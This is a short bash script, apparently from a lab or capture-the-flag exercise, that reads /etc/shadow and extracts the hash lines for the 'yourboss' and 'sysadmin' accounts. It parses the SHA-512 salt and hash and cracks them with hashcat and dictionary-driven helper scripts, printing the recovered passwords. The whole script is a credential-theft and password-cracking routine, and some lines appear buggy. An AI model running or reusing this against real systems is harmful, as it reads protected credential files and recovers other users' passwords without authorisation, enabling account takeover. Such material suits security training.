#!/bin/bash
TempWorker=correctbatteryhorsestaple99
TempWorkerHashed=$(grep "tempworker.*\n" /etc/shadow)
filename='/etc/shadow'
while read line; do
	if [[ $line =~ "yourboss" ]]
	then
		bossStuff=$line
	fi
	if [[ $line =~ "sysadmin" ]]
	then
		SysAdmin=$line
	fi
done < $filename
echo $SysAdmin > SysPassword.txt
touch Decoded.txt
IFS=':'
read -ra ADDR <<< "$bossStuff"
IFS='$'
read -ra ADDR2 <<< "${ADDR[1]}"
IFS=''
bossSalt=${ADDR2[2]}
bossHash="$"${ADDR2[1]}"$"$bossSalt"$"${ADDR2[3]}
DecryptedSys=$( hashcat --force -m 1800 SysPassword.txt Decoded.txt /usr/share/dict/american-english-small > Decoded.txt)
DecryptedPassSys=$(python3 decodeSys.py)
#Finished up making it just the password section now we just need to figure out salt
BossPassword=$(python3 fun.py '/usr/share/dict/american-english' $bossHash $bossSalt)
echo $BossPassword
#now I need to use john to break the sysadmins password
echo $TempWorker
echo $DecryptedPassSys
	
